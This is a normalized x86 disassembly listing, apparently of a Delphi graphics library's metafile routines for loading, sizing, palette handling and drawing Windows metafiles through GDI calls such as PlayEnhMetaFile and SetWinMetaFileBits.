push ebp
push sub_42709e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_419898
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_404530
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_405794
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405974
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4270a5
lea eax [ ebp - 0x8 ]
call sub_405530
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_427110
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4271bc
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4271bc
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4271bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_427190
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_404650
mov eax [ esi + 0x8 ]
call sub_404650
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4271bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_419740
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427200
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_419740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427224
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_419898
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_419898
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427280
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4272b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404528
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419f24
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_4272e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4047dc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404650
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_404864
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_404864
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40484c
sub_427360
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_4273f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_404650
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_404528
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_427224
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427487
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_4259e0
mov eax [ ebx + 0xc ]
call sub_404650
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_404864
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40484c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4274d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_427548
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_427360
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_427360
jmp r-xdata
mov edx ebx
mov eax esi
call sub_419e40
mov edx ebx
mov eax esi
call sub_427360
jmp r-xdata
pop esi
pop ebx
retn
sub_4275a4
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4275c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4275f4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4276fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
movzx ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_405794
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_427020
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_404650
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_404b30#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427701
lea eax [ ebp - 0x48 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427681
mov eax [ ebp - 0x4 ]
call sub_404650
call sub_404eec
call sub_404f40
mov eax [ ebx + 0xc ]
call sub_404650
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427701
lea eax [ ebp - 0x48 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404864
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427708
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_404530
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_4039ac
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx ecx [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_427760
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_4277dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4275f4
mov eax [ ebp - 0x8 ]
push eax
push sub_427708
push ebp
call sub_427760
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427825
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4238c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_427868
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_426cb4
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4278e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_428938
mov edx esi
mov eax ebx
call sub_419e40
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
movzx eax [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_428934
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_427974
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_425714
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_425714
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_425714
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_425714
push eax
call SelectPalette
sub_427a0c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427bb4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427a70
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4238c0
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_427afc
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427bb4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427b60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4280e0
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41b714
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_427d18
mov edx esi
mov eax ebx
call sub_427c48
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_427bb4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_428938
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_428934
pop esi
pop ebx
retn
sub_427bdc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4280e0
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_427d18
mov edx esi
mov eax ebx
call sub_427c48
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_427c48
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_427bb4
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41b940
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_402f00
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427d08
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4030fc
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41b940
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425a10
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d0f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402f1c
retn
call sub_425a10
sub_427d18
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_427bb4
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_425a10
lea eax [ ebp - 0x22 ]
call sub_426870
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_402f00
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427e87
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
movzx edx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425a10
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e8e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_402f1c
retn
call sub_425a10
sub_427e98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427f41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_427f1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40a6c4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40e904
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f26
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_427f7c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427bb4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427ff0
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427ff0
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427ff0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_427bb4
pop esi
pop ebx
retn
mov eax ebx
call sub_428140
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42802c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_427bb4
pop esi
pop ebx
retn
mov eax ebx
call sub_428140
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42806c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427bb4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42802c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42802c
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4280e0
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41b714
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_428140
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_427bb4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
